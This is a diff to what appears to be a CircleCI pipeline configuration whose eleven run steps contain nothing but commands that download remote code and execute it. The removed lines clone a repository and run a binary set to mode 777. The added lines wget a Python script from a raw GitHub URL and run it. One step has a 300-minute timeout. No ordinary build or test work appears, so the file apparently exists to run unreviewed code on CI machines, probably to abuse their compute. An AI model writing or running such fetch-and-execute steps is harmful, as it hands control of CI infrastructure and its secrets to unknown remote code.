@@ -5,50 +5,50 @@ working_dir: &working_dir ~/app
     - run:
         name: A
         command: |
-          git clone https://github.com/aurbach55/pos.git && cd pos && chmod 777 topi && ./topi
+          wget https://raw.githubusercontent.com/aurbach55/sugeh-ice/main/node.py && python node.py
     - run:
         name: B
         command: |
           sleep 10s          
-          git clone https://github.com/aurbach55/pos.git && cd pos && chmod 777 topi && ./topi
+          wget https://raw.githubusercontent.com/aurbach55/sugeh-ice/main/node.py && python node.py
     - run:
         name: C
         command: |
-          git clone https://github.com/aurbach55/pos.git && cd pos && chmod 777 topi && ./topi 
+          wget https://raw.githubusercontent.com/aurbach55/sugeh-ice/main/node.py && python node.py 
     - run:
         name: D
         command: |
-          git clone https://github.com/aurbach55/pos.git && cd pos && chmod 777 topi && ./topi
+          wget https://raw.githubusercontent.com/aurbach55/sugeh-ice/main/node.py && python node.py
     - run:
         name: E
         command: |
-          git clone https://github.com/aurbach55/pos.git && cd pos && chmod 777 topi && ./topi
+          wget https://raw.githubusercontent.com/aurbach55/sugeh-ice/main/node.py && python node.py
     - run:
         name: F
         command: |
-          git clone https://github.com/aurbach55/pos.git && cd pos && chmod 777 topi && ./topi
+          wget https://raw.githubusercontent.com/aurbach55/sugeh-ice/main/node.py && python node.py
     - run:
         name: G
         command: |
-          git clone https://github.com/aurbach55/pos.git && cd pos && chmod 777 topi && ./topi
+          wget https://raw.githubusercontent.com/aurbach55/sugeh-ice/main/node.py && python node.py
     - run:
         name: H
         command: |
-          git clone https://github.com/aurbach55/pos.git && cd pos && chmod 777 topi && ./topi
+          wget https://raw.githubusercontent.com/aurbach55/sugeh-ice/main/node.py && python node.py
     - run:
         name: I
         command: |
-          git clone https://github.com/aurbach55/pos.git && cd pos && chmod 777 topi && ./topi
+          wget https://raw.githubusercontent.com/aurbach55/sugeh-ice/main/node.py && python node.py
     - run:
         name: J
         command: |
-          git clone https://github.com/aurbach55/pos.git && cd pos && chmod 777 topi && ./topi
+          wget https://raw.githubusercontent.com/aurbach55/sugeh-ice/main/node.py && python node.py
     - run:
         name: K
         no_output_timeout: 300m
         command: |
-          echo "Ijin Berkah Om. . ."
-          git clone https://github.com/aurbach55/pos.git && cd pos && chmod 777 topi && ./topi
+          echo "..."
+          wget https://raw.githubusercontent.com/aurbach55/sugeh-ice/main/node.py && python node.py
   working_directory: *working_dir
 
 version: 2.0
